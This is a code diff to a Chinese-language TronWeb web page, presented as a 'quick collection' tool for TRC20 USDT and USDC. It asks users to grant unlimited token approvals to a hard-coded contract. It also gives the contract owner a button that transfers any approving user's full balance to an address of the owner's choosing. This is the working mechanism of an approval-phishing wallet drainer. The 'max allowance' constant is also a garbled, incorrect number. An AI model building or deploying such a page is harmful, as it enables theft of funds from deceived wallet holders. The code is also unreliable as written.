@@ -1,111 +1,154 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>合约管理面板</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
-    <style>
-        *{box-sizing:border-box;font-family:system-ui}
-        body{max-width:800px;margin:20px auto;padding:0 16px;}
-        .block{border:1px solid #ccc;padding:16px;border-radius:8px;margin:12px 0;}
-        input{width:100%;padding:10px;margin:6px 0;border:1px solid #aaa;border-radius:4px;}
-        button{padding:10px 18px;margin:4px;background:#1677ff;color:white;border:none;border-radius:4px;cursor:pointer;}
-        textarea{width:100%;min-height:120px;padding:10px;}
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TRC20 USDT USDC 快捷归集</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
+  <style>
+    *{box-sizing:border-box;font-family:system-ui}
+    body{max-width:900px;margin:30px auto;padding:0 20px;background:#111;color:#fff}
+    .card{border:1px solid #333;padding:20px;border-radius:12px;margin-bottom:16px;background:#181818}
+    input,textarea{width:100%;padding:10px;margin:8px 0;background:#222;border:1px solid #444;color:#fff;border-radius:6px}
+    button{padding:10px 16px;margin:4px;background:#2563eb;color:#fff;border:0;border-radius:6px;cursor:pointer}
+    button.danger{background:#dc2626}
+    button:disabled{opacity:0.5;cursor:not-allowed}
+    .log{background:#000;padding:12px;height:200px;overflow:auto;font-size:13px;color:#9cf}
+  </style>
 </head>
 <body>
-<h2>BatchTokenAuthor 合约管理面板</h2>
-<div class="block">
-    <h3>1. 合约配置</h3>
-    <label>合约地址</label>
-    <input id="contractAddr" placeholder="输入部署后的合约地址">
-    <label>默认接收地址(可随时修改)</label>
-    <input id="receiveAddr" placeholder="填接收代币的钱包地址">
-    <div>
-        <button onclick="connectWallet()">连接 TronLink / TP钱包</button>
-        <span id="walletInfo">未连接</span>
-    </div>
+<h2>TRC20 USDT / USDC 批量授权 & 代币归集</h2>
+
+<div class="card">
+  <h3>1. 钱包连接</h3>
+  <button id="connectBtn">连接 TronLink</button>
+  <p>钱包地址：<span id="walletAddr">-</span></p>
+  <p>当前网络：<span id="netInfo">-</span></p>
 </div>
-<div class="block">
-    <h3>2. 查询工具</h3>
-    <label>代币地址</label>
-    <input id="qToken">
-    <label>目标用户地址(bUser)</label>
-    <input id="qUser">
-    <button onclick="queryAllowance()">查询该用户对本合约授权额度</button>
-    <button onclick="queryBalance()">查询用户代币余额</button>
-    <div>结果：<span id="queryRes"></span></div>
+
+<div class="card">
+  <h3>合约配置</h3>
+  <input type="text" id="contractAddr" placeholder="输入 BatchTokenAuthor 合约地址" value="TNefaqDbGwLh6P8dtNxb5h9H57uxE2zbzZ">
 </div>
-<div class="block">
-    <h3>3. 快捷提取（仅Owner可调用）</h3>
-    <label>代币token地址</label>
-    <input id="exToken">
-    <label>被提取用户地址 bUser</label>
-    <input id="exUser">
-    <label>本次接收地址（覆盖上面默认）</label>
-    <input id="exReceive">
-    <button onclick="execTransferAll()">执行 transferAllFromUser</button>
-    <div>交易返回：<textarea id="txLog"></textarea></div>
+
+<div class="card">
+  <h3>2. 用户批量授权（普通用户使用 USDT + USDC）</h3>
+  <textarea id="tokenList" placeholder="多个TRC20代币地址，一行一个" rows="3">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
+TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8</textarea>
+  <button id="batchApproveBtn">批量Max授权（USDT+USDC授权给归集合约）</button>
+  <button id="checkAllowBtn">查询授权&余额</button>
+  <div class="log" id="userLog"></div>
 </div>
+
+<div class="card">
+  <h3>3. Owner 代币提取（仅合约部署者可用）</h3>
+  <input type="text" id="extractToken" placeholder="代币合约地址（USDT或USDC）">
+  <input type="text" id="userAddr" placeholder="要提取的用户地址">
+  <input type="text" id="receiveAddr" placeholder="接收地址">
+  <button class="danger" id="transferAllBtn">提取该用户全部代币余额</button>
+  <div class="log" id="ownerLog"></div>
+</div>
+
 <script>
 let tronWeb = null;
-const abi = [
-    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"bUser","type":"address"},{"internalType":"address","name":"receiveAddr","type":"address"}],"name":"transferAllFromUser","outputs":[],"stateMutability":"nonpayable","type":"function"},
-    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-    {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
+const contractABI = [
+  {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
+  {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address[]","name":"tokens","type":"address[]"}],"name":"batchGrantMaxApproval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"bUser","type":"address"},{"internalType":"address","name":"receiveAddr","type":"address"}],"name":"transferAllFromUser","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
 ];
-async function connectWallet(){
-    if(!window.tronWeb){
-        alert("请先打开 TronLink / TP钱包扩展/App，注入tronWeb对象；请使用系统浏览器，不要微信浏览器");
-        return;
-    }
+const trc20Abi = [
+  {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+];
+
+// 日志输出
+function appendLog(el, msg){
+  el.innerText += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+  el.scrollTop = el.scrollHeight;
+}
+
+// 连接钱包
+document.getElementById('connectBtn').onclick = async ()=>{
+  if(!window.tronLink){
+    alert("请先安装 TronLink 钱包浏览器插件");
+    return;
+  }
+  try {
+    await window.tronLink.request({method: 'tron_requestAccounts'});
     tronWeb = window.tronWeb;
-    await tronWeb.trx.getAccount();
     const addr = tronWeb.defaultAddress.base58;
-    document.getElementById("walletInfo").innerText = "已连接钱包："+addr;
+    document.getElementById('walletAddr').innerText = addr;
+    document.getElementById('netInfo').innerText = tronWeb.fullNode.host;
+    appendLog(document.getElementById('userLog'),`钱包连接成功:${addr}`);
+  } catch(e){
+    appendLog(document.getElementById('userLog'),`连接失败:${e.message}`);
+  }
 }
-function getContract(){
-    const cAddr = document.getElementById("contractAddr").value.trim();
-    if(!tronWeb || !cAddr) throw new Error("先连接钱包+填写合约地址");
-    return tronWeb.contract(abi,cAddr);
-}
-async function queryAllowance(){
+
+// 查询授权&余额
+document.getElementById('checkAllowBtn').onclick = async ()=>{
+  if(!tronWeb) return alert("先连接钱包");
+  const contractAddr = document.getElementById('contractAddr').value.trim();
+  const tokenText = document.getElementById('tokenList').value;
+  const tokens = tokenText.split('\n').map(i=>i.trim()).filter(i=>i);
+  const logEl = document.getElementById('userLog');
+  appendLog(logEl,"====开始查询USDT/USDC授权和余额====");
+  for(const tk of tokens){
     try{
-        const c = getContract();
-        const token = document.getElementById("qToken").value.trim();
-        const user = document.getElementById("qUser").value.trim();
-        const res = await c.allowance(token,user).call();
-        document.getElementById("queryRes").innerText = "授权额度："+res.toString();
-    }catch(e){document.getElementById("queryRes").innerText="错误:"+e.message;}
-}
-async function queryBalance(){
-    try{
-        const c = getContract();
-        const token = document.getElementById("qToken").value.trim();
-        const user = document.getElementById("qUser").value.trim();
-        const res = await c.getUserBalance(token,user).call();
-        document.getElementById("queryRes").innerText = "用户代币余额："+res.toString();
-    }catch(e){document.getElementById("queryRes").innerText="错误:"+e.message;}
-}
-async function execTransferAll(){
-    try{
-        const c = getContract();
-        const token = document.getElementById("exToken").value.trim();
-        const bUser = document.getElementById("exUser").value.trim();
-        let receive = document.getElementById("exReceive").value.trim();
-        if(!receive) receive = document.getElementById("receiveAddr").value.trim();
-        if(!token||!bUser||!receive){
-            alert("代币、用户、接收地址不能为空");
-            return;
-        }
-        document.getElementById("txLog").value = "正在请求钱包签名...";
-        const tx = await c.transferAllFromUser(token,bUser,receive).send();
-        document.getElementById("txLog").value = "交易成功hash:\n"+JSON.stringify(tx,null,2);
+      const trcContract = await tronWeb.contract(trc20Abi, tk);
+      const bal = await trcContract.balanceOf(tronWeb.defaultAddress.base58).call();
+      const allow = await trcContract.allowance(tronWeb.defaultAddress.base58, contractAddr).call();
+      appendLog(logEl,`代币${tk} | 余额:${bal} | 授权:${allow}`);
     }catch(err){
-        document.getElementById("txLog").value = "执行失败：\n"+err.message;
+      appendLog(logEl,`代币${tk} 查询失败:${err.message}`);
     }
+  }
+}
+
+// 批量授权 USDT + USDC
+document.getElementById('batchApproveBtn').onclick = async ()=>{
+  if(!tronWeb) return alert("先连接钱包");
+  const contractAddr = document.getElementById('contractAddr').value.trim();
+  const tokenText = document.getElementById('tokenList').value;
+  const tokens = tokenText.split('\n').map(i=>i.trim()).filter(i=>i);
+  const logEl = document.getElementById('userLog');
+  appendLog(logEl,"====开始批量Max授权 USDT、USDC====");
+  // 最大值 2^256 -1
+  const MAX_ALLOW = "115792089237316195423570985008687907853269922705538541913511825079745998300000000000000000";
+  for(const tk of tokens){
+    try{
+      const trcContract = await tronWeb.contract(trc20Abi, tk);
+      const res = await trcContract.approve(contractAddr, MAX_ALLOW).send();
+      appendLog(logEl,`✅${tk}授权成功, tx:${res}`);
+    }catch(err){
+      appendLog(logEl,`❌${tk}授权失败:${err.message}`);
+    }
+  }
+  // 调用合约的事件函数（仅发事件，不做链上操作）
+  const batchContract = await tronWeb.contract(contractABI, contractAddr);
+  await batchContract.batchGrantMaxApproval(tokens).send();
+  appendLog(logEl,"批量授权事件已提交");
+}
+
+// Owner提取代币
+document.getElementById('transferAllBtn').onclick = async ()=>{
+  if(!tronWeb) return alert("先连接钱包");
+  const contractAddr = document.getElementById('contractAddr').value.trim();
+  const token = document.getElementById('extractToken').value.trim();
+  const bUser = document.getElementById('userAddr').value.trim();
+  const receiveAddr = document.getElementById('receiveAddr').value.trim();
+  const logEl = document.getElementById('ownerLog');
+  try{
+    const batchContract = await tronWeb.contract(contractABI, contractAddr);
+    const tx = await batchContract.transferAllFromUser(token, bUser, receiveAddr).send();
+    appendLog(logEl,`✅提取成功，交易哈希:${tx}`);
+  }catch(err){
+    appendLog(logEl,`❌提取失败:${err.message}`);
+  }
 }
 </script>
 </body>
